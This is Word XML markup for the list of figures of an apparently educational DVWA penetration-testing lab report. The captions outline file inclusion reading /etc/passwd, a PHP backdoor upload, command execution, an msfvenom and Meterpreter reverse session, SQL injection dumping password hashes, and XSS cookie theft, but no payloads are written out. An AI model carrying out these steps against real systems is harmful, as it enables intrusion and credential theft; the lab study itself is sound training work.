    <w:p w14:paraId="77BE68AC" w14:textId="0BCA02FB" w:rsidR="008822EB" w:rsidRDefault="00ED0E81">
      <w:pPr>
        <w:pStyle w:val="TableofFigures"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00ED0E81">
        <w:t>Figure 1.2: DVWA File Inclusion Page Displaying DVWA Homepage</w:t>
      </w:r>
      <w:hyperlink w:anchor="_Toc64889314" w:history="1">
        <w:r w:rsidR="008822EB">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00C5264E">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>7</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5F18A6D7" w14:textId="50EB2AA5" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81">
      <w:pPr>
        <w:pStyle w:val="TableofFigures"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
      </w:pPr>
      <w:r w:rsidRPr="00ED0E81">
        <w:t>Figure 1.3: DVWA File Inclusion Page Displaying /etc/passwd content</w:t>
      </w:r>
      <w:r>
        <w:t>..........................</w:t>
      </w:r>
      <w:r w:rsidR="00C5264E">
        <w:t>..7</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FCE1698" w14:textId="500011FF" w:rsidR="008822EB" w:rsidRPr="00ED0E81" w:rsidRDefault="008822EB" w:rsidP="00ED0E81">
      <w:pPr>
        <w:pStyle w:val="TableofFigures"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="0000FF" w:themeColor="hyperlink"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure2.1: </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:t>DVWA File Upload Page.</w:t>
      </w:r>
      <w:r>
        <w:t>....................................................................................</w:t>
      </w:r>
      <w:r w:rsidR="00C5264E">
        <w:t>8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69B61E5A" w14:textId="6D3570FF" w:rsidR="008822EB" w:rsidRDefault="008822EB" w:rsidP="008822EB">
      <w:r>
        <w:t>Figure2.2:</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:t>Simple Backdoor PHP...............................</w:t>
      </w:r>
      <w:r>
        <w:t>..........................................................8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="144103FE" w14:textId="64372D15" w:rsidR="008822EB" w:rsidRDefault="00ED0E81" w:rsidP="008822EB">
      <w:r w:rsidRPr="00ED0E81">
        <w:t>Figure 2.3: DVWA Webpage Source Code Showing Check on File</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Extensions....</w:t>
      </w:r>
      <w:r w:rsidR="008822EB">
        <w:t>..............</w:t>
      </w:r>
      <w:r w:rsidR="00C5264E">
        <w:t>9</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="316C5195" w14:textId="26E89175" w:rsidR="008822EB" w:rsidRDefault="00F9795F" w:rsidP="008822EB">
      <w:r w:rsidRPr="00F9795F">
        <w:t>Figure 2.4: DVWA File Upload Error Message</w:t>
      </w:r>
      <w:r w:rsidR="008822EB">
        <w:t>..............................</w:t>
      </w:r>
      <w:r w:rsidR="001C1FFC">
        <w:t>...</w:t>
      </w:r>
      <w:r w:rsidR="008822EB">
        <w:t>.................................</w:t>
      </w:r>
      <w:r w:rsidR="00C5264E">
        <w:t>.9</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DB06948" w14:textId="03C42280" w:rsidR="008822EB" w:rsidRDefault="00C5264E" w:rsidP="008822EB">
      <w:r w:rsidRPr="00C5264E">
        <w:t xml:space="preserve">Figure 2.5: </w:t>
      </w:r>
      <w:r>
        <w:t>Using Burp-Suite as an Intercepting Proxy</w:t>
      </w:r>
      <w:r w:rsidR="008822EB">
        <w:t>...............</w:t>
      </w:r>
      <w:r>
        <w:t>.......</w:t>
      </w:r>
      <w:r w:rsidR="00A81AC6">
        <w:t>..............................</w:t>
      </w:r>
      <w:r>
        <w:t>10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03C3D344" w14:textId="23037469" w:rsidR="008822EB" w:rsidRDefault="00C5264E" w:rsidP="008822EB">
      <w:r w:rsidRPr="00C5264E">
        <w:t>Figure 2.6: Successful upload Page after modifying image/jpeg</w:t>
      </w:r>
      <w:r w:rsidR="00A81AC6">
        <w:t>......................</w:t>
      </w:r>
      <w:r w:rsidR="008822EB">
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="008822EB">
        <w:t>.............</w:t>
      </w:r>
      <w:r>
        <w:t>.10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A8C7E98" w14:textId="28B25A72" w:rsidR="008822EB" w:rsidRDefault="00C5264E" w:rsidP="008822EB">
      <w:r w:rsidRPr="00C5264E">
        <w:t xml:space="preserve">Figure 2.7: Display after including the simple-backdoor file  </w:t>
      </w:r>
      <w:r w:rsidR="008822EB">
        <w:t>.....................................</w:t>
      </w:r>
      <w:r w:rsidR="00A81AC6">
        <w:t>.....</w:t>
      </w:r>
      <w:r w:rsidR="00984B08">
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t>1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AE14B1C" w14:textId="6B1FAA42" w:rsidR="008822EB" w:rsidRDefault="00C5264E" w:rsidP="00C5264E">
      <w:r>
        <w:t>Figure 2.8: Passing id Command to CMD Parameter</w:t>
      </w:r>
      <w:r w:rsidR="00A81AC6">
        <w:t>.....</w:t>
      </w:r>
      <w:r>
        <w:t>...........................................</w:t>
      </w:r>
      <w:r w:rsidR="00A81AC6">
        <w:t>.......</w:t>
      </w:r>
      <w:r w:rsidR="00984B08">
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t>2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="400B4C5C" w14:textId="52D0DDDD" w:rsidR="008822EB" w:rsidRDefault="00C5264E" w:rsidP="00C5264E">
      <w:r>
        <w:t xml:space="preserve">Figure 2.9: Passing PWD Command to CMD Parameter  </w:t>
      </w:r>
      <w:r w:rsidR="00A81AC6">
        <w:t>....</w:t>
      </w:r>
      <w:r>
        <w:t>.....................................</w:t>
      </w:r>
      <w:r w:rsidR="00A81AC6">
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>......</w:t>
      </w:r>
      <w:r w:rsidR="00984B08">
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t>2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66C63403" w14:textId="41048437" w:rsidR="008822EB" w:rsidRDefault="00C5264E" w:rsidP="008822EB">
      <w:r w:rsidRPr="00C5264E">
        <w:t>Figure 2.10: Chaining Multiple CMD Commands in a single call</w:t>
      </w:r>
      <w:r w:rsidR="00A81AC6">
        <w:t>..................................</w:t>
      </w:r>
      <w:r>
        <w:t>..</w:t>
      </w:r>
      <w:r w:rsidR="00984B08">
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t>3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B61A8CB" w14:textId="045A7D01" w:rsidR="00A81AC6" w:rsidRDefault="00C5264E" w:rsidP="008822EB">
      <w:r w:rsidRPr="00C5264E">
        <w:t>Figure 3.1: Location of Index.html on Remote Kali Machine</w:t>
      </w:r>
      <w:r w:rsidR="00984B08">
        <w:t>.................................</w:t>
      </w:r>
      <w:r>
        <w:t>.........14</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D1B2B43" w14:textId="6E39B6D9" w:rsidR="008822EB" w:rsidRDefault="00C5264E" w:rsidP="008822EB">
      <w:r w:rsidRPr="00C5264E">
        <w:t>Figure 3.2: Kali Homepage Loaded on DVWA File Inclusion Page</w:t>
      </w:r>
      <w:r w:rsidR="00984B08">
        <w:t>............................</w:t>
      </w:r>
      <w:r>
        <w:t>...</w:t>
      </w:r>
      <w:r w:rsidR="00984B08">
        <w:t>.1</w:t>
      </w:r>
      <w:r>
        <w:t>5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56F45873" w14:textId="25ABA36D" w:rsidR="00A81AC6" w:rsidRDefault="00C5264E" w:rsidP="008822EB">
      <w:r w:rsidRPr="00C5264E">
        <w:t>Figure 4.1: Msfvenom Generating Payload</w:t>
      </w:r>
      <w:r w:rsidR="00A81AC6" w:rsidRPr="00A81AC6">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00984B08">
        <w:t>........................................</w:t>
      </w:r>
      <w:r>
        <w:t>............................</w:t>
      </w:r>
      <w:r w:rsidR="00984B08">
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t>6</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="678A964C" w14:textId="66EE5DB9" w:rsidR="00A81AC6" w:rsidRDefault="00C5264E" w:rsidP="008822EB">
      <w:r w:rsidRPr="00C5264E">
        <w:t xml:space="preserve">Figure 4.2: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C5264E">
        <w:t>MsfConsole</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C5264E">
        <w:t xml:space="preserve"> Multi Handle Listening for reverse Connection</w:t>
      </w:r>
      <w:r w:rsidR="00984B08">
        <w:t>................</w:t>
      </w:r>
      <w:r>
        <w:t>.....</w:t>
      </w:r>
      <w:r w:rsidR="00984B08">
        <w:t>.1</w:t>
      </w:r>
      <w:r>
        <w:t>6</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A256BFE" w14:textId="30A4250C" w:rsidR="00A81AC6" w:rsidRDefault="00C5264E" w:rsidP="008822EB">
      <w:r w:rsidRPr="00C5264E">
        <w:t>Figure 4.3: Setting Listening IP Address And Port To Match Generated Payload</w:t>
      </w:r>
      <w:r w:rsidR="00984B08">
        <w:t>.......1</w:t>
      </w:r>
      <w:r>
        <w:t>7</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22D8B1A2" w14:textId="7DE68645" w:rsidR="00A81AC6" w:rsidRDefault="00C5264E" w:rsidP="008822EB">
      <w:r w:rsidRPr="00C5264E">
        <w:t>Figure 4.4: Payload File Included in File Inclusion URL</w:t>
      </w:r>
      <w:r w:rsidR="00984B08">
        <w:t>.................</w:t>
      </w:r>
      <w:r>
        <w:t>.........................</w:t>
      </w:r>
      <w:r w:rsidR="00984B08">
        <w:t>...1</w:t>
      </w:r>
      <w:r>
        <w:t>7</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07961639" w14:textId="10AAAE37" w:rsidR="008822EB" w:rsidRDefault="00C5264E" w:rsidP="008822EB">
      <w:r w:rsidRPr="00C5264E">
        <w:t>Figure 4.5: Open Meterpreter Session</w:t>
      </w:r>
      <w:r w:rsidR="00984B08">
        <w:t>.........</w:t>
      </w:r>
      <w:r>
        <w:t>..........................................................</w:t>
      </w:r>
      <w:r w:rsidR="00984B08">
        <w:t>.......1</w:t>
      </w:r>
      <w:r>
        <w:t>7</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65CF3FC1" w14:textId="18C5E7BD" w:rsidR="00A81AC6" w:rsidRDefault="00C5264E" w:rsidP="008822EB">
      <w:r w:rsidRPr="00C5264E">
        <w:t>Figure 5.1: User Information for ID 1</w:t>
      </w:r>
      <w:r w:rsidR="00984B08">
        <w:t>.........................................</w:t>
      </w:r>
      <w:r>
        <w:t>..............................</w:t>
      </w:r>
      <w:r w:rsidR="00984B08">
        <w:t>....1</w:t>
      </w:r>
      <w:r>
        <w:t>8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C2526E1" w14:textId="49104C7D" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00C5264E">
      <w:r w:rsidRPr="00C5264E">
        <w:t xml:space="preserve">Figure 5.2: Using 1’ To Test For </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C5264E">
        <w:t>SQLi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C5264E">
        <w:t xml:space="preserve"> Vulnerability</w:t>
      </w:r>
      <w:r w:rsidRPr="00A81AC6">
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>.................................</w:t>
      </w:r>
      <w:r>
        <w:t>............</w:t>
      </w:r>
      <w:r>
        <w:t>.......1</w:t>
      </w:r>
      <w:r>
        <w:t>8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68517155" w14:textId="69ABD6A1" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00C5264E">
      <w:r w:rsidRPr="00C5264E">
        <w:t xml:space="preserve">Figure 5.3: Using 1 and 1=1 To Test For </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C5264E">
        <w:t>SQLi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C5264E">
        <w:t xml:space="preserve"> Vulnerability</w:t>
      </w:r>
      <w:r>
        <w:t>..........</w:t>
      </w:r>
      <w:r>
        <w:t>.........................</w:t>
      </w:r>
      <w:r>
        <w:t>......1</w:t>
      </w:r>
      <w:r>
        <w:t>9</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1775C3CA" w14:textId="4FB4805C" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00C5264E">
      <w:r w:rsidRPr="00C5264E">
        <w:t xml:space="preserve">Figure 5.4: Using 1 and 1=2 To Test For </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C5264E">
        <w:t>SQLi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C5264E">
        <w:t xml:space="preserve"> Vulnerability</w:t>
      </w:r>
      <w:r>
        <w:t>......</w:t>
      </w:r>
      <w:r>
        <w:t>...................................19</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BE4E42B" w14:textId="775E1D47" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00C5264E">
      <w:r w:rsidRPr="00C5264E">
        <w:t>Figure 5.5: Checking For Number of Columns</w:t>
      </w:r>
      <w:r>
        <w:t>...............</w:t>
      </w:r>
      <w:r>
        <w:t>..........................................</w:t>
      </w:r>
      <w:r>
        <w:t>.....</w:t>
      </w:r>
      <w:r>
        <w:t>20</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3711F98C" w14:textId="3B616EC1" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00C5264E">
      <w:r w:rsidRPr="00C5264E">
        <w:t xml:space="preserve">Figure 5.6: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C5264E">
        <w:t>UsingUNION</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C5264E">
        <w:t xml:space="preserve"> SELECT Statements</w:t>
      </w:r>
      <w:r>
        <w:t>.....</w:t>
      </w:r>
      <w:r>
        <w:t>....................................................</w:t>
      </w:r>
      <w:r>
        <w:t>....</w:t>
      </w:r>
      <w:r>
        <w:t>20</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="479F44FA" w14:textId="138BE2EE" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00C5264E">
      <w:r w:rsidRPr="00C5264E">
        <w:lastRenderedPageBreak/>
        <w:t>Figure 5.7: Using Union Select Statements To Display Database Name and User</w:t>
      </w:r>
      <w:r>
        <w:t>.........</w:t>
      </w:r>
      <w:r>
        <w:t>21</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AA445D6" w14:textId="1715D9B1" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00C5264E">
      <w:r w:rsidRPr="00C5264E">
        <w:t xml:space="preserve">Figure 5.8: Using </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C5264E">
        <w:t>information_schema</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C5264E">
        <w:t xml:space="preserve"> To Display All Available Tables</w:t>
      </w:r>
      <w:r>
        <w:t>...</w:t>
      </w:r>
      <w:r>
        <w:t>.....................21</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B1822B8" w14:textId="60B7E6DC" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00C5264E">
      <w:r w:rsidRPr="00C5264E">
        <w:t>Figure 5.9: Displaying Usernames and hashed Passwords available on User Table</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>......22</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27F8CFFA" w14:textId="028943D4" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00C5264E">
      <w:r w:rsidRPr="00C5264E">
        <w:t>Figure 5.10: Invalid Page When SQL WHERE Clause used due to webpage filters</w:t>
      </w:r>
      <w:r>
        <w:t>.........</w:t>
      </w:r>
      <w:r>
        <w:t>22</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F4F6937" w14:textId="65EC7B09" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00C5264E">
      <w:r w:rsidRPr="00C5264E">
        <w:t>Figure 5.11: Using Burp’s Decoder To Convert Text To Hex</w:t>
      </w:r>
      <w:r>
        <w:t>..</w:t>
      </w:r>
      <w:r>
        <w:t>...........................................23</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F841EF3" w14:textId="6D380292" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00C5264E">
      <w:r w:rsidRPr="00C5264E">
        <w:t>Figure 5.12: Displaying Tables From DVWA Database Using Hex in WHERE Clause</w:t>
      </w:r>
      <w:r>
        <w:t>....</w:t>
      </w:r>
      <w:r>
        <w:t>23</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65A318B8" w14:textId="7DD77432" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00C5264E">
      <w:r w:rsidRPr="00C5264E">
        <w:t>Figure 6.1: DVWA XSS Reflected Page With Displayed Input</w:t>
      </w:r>
      <w:r>
        <w:t>...</w:t>
      </w:r>
      <w:r>
        <w:t>.....................................</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>24</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CF8479A" w14:textId="2F429471" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00C5264E">
      <w:r w:rsidRPr="00C5264E">
        <w:t>Figure 6.2: DVWA XSS Reflected Page With Displayed Input</w:t>
      </w:r>
      <w:r>
        <w:t>....</w:t>
      </w:r>
      <w:r>
        <w:t>..................................</w:t>
      </w:r>
      <w:r>
        <w:t>...</w:t>
      </w:r>
      <w:r>
        <w:t>24</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BDFA2FC" w14:textId="7603F1B9" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00C5264E">
      <w:r w:rsidRPr="00C5264E">
        <w:t>Figure 6.3: DVWA XSS Reflected Page Source Code Verifying Lack of Encoding</w:t>
      </w:r>
      <w:r>
        <w:t>..........</w:t>
      </w:r>
      <w:r>
        <w:t>.25</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D7C4E53" w14:textId="5B958451" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00C5264E">
      <w:r w:rsidRPr="00C5264E">
        <w:t>Figure 6.4: DVWA XSS Reflected Page After Execution of simple script code</w:t>
      </w:r>
      <w:r>
        <w:t>......</w:t>
      </w:r>
      <w:r>
        <w:t>......</w:t>
      </w:r>
      <w:r>
        <w:t>....</w:t>
      </w:r>
      <w:r>
        <w:t>25</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54D5A982" w14:textId="405A0550" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00C5264E">
      <w:r w:rsidRPr="00C5264E">
        <w:t>Figure 6.5: Simple Python HTTP Server</w:t>
      </w:r>
      <w:r>
        <w:t>....</w:t>
      </w:r>
      <w:r>
        <w:t>.......................................................................26</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23D4B4AC" w14:textId="5ABF1C67" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00C5264E">
      <w:r w:rsidRPr="00C5264E">
        <w:t>Figure 6.6: Inputting Script Payload To Retrieve User Cookie</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>......................................</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>26</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="291A6918" w14:textId="49B4D6B9" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00C5264E">
      <w:r w:rsidRPr="00C5264E">
        <w:t>Figure 6.7: Simple HTTP Server Output</w:t>
      </w:r>
      <w:r>
        <w:t>......</w:t>
      </w:r>
      <w:r>
        <w:t>..................................................................</w:t>
      </w:r>
      <w:r>
        <w:t>...</w:t>
      </w:r>
      <w:r>
        <w:t>27</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4807931A" w14:textId="77777777" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00C5264E"/>
    <w:p w14:paraId="113CFF91" w14:textId="77777777" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="008822EB"/>
    <w:p w14:paraId="42663BFF" w14:textId="77777777" w:rsidR="00A81AC6" w:rsidRPr="008822EB" w:rsidRDefault="00A81AC6" w:rsidP="008822EB"/>
    <w:p w14:paraId="3D76B72B" w14:textId="7D553C36" w:rsidR="00D00ED1" w:rsidRDefault="008822EB">
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B887196" w14:textId="7C7A6526" w:rsidR="00D00ED1" w:rsidRDefault="00D00ED1"/>
    <w:p w14:paraId="7E8764F4" w14:textId="2B38D21D" w:rsidR="00D00ED1" w:rsidRDefault="00D00ED1"/>
    <w:p w14:paraId="3DE1648C" w14:textId="0ADB29AD" w:rsidR="00D00ED1" w:rsidRDefault="00D00ED1"/>
    <w:p w14:paraId="14DA8B05" w14:textId="1F1408FF" w:rsidR="00D00ED1" w:rsidRDefault="00D00ED1"/>
    <w:p w14:paraId="5EA9F1BB" w14:textId="38AB7DA2" w:rsidR="00D00ED1" w:rsidRDefault="00D00ED1"/>
    <w:p w14:paraId="77EEEF57" w14:textId="77777777" w:rsidR="00984B08" w:rsidRDefault="00984B08" w:rsidP="00984B08">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="E51D1B" w:themeColor="accent4" w:themeShade="BF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="063604B2" w14:textId="77777777" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00984B08">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="105E9F56" w14:textId="77777777" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00984B08">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="17A1EB4B" w14:textId="77777777" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00984B08">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6F18327F" w14:textId="77777777" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00984B08">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1929E422" w14:textId="77777777" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00984B08">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="643908EE" w14:textId="77777777" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00984B08">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="75D3F70D" w14:textId="77777777" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00984B08">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="70DF3404" w14:textId="77777777" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00984B08">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="255FAB29" w14:textId="77777777" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00984B08">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F453C4F" w14:textId="77777777" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00984B08">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3A3AFED1" w14:textId="77777777" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00984B08">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F2A6C7D" w14:textId="77777777" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00984B08">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="34732D84" w14:textId="77777777" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00984B08">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
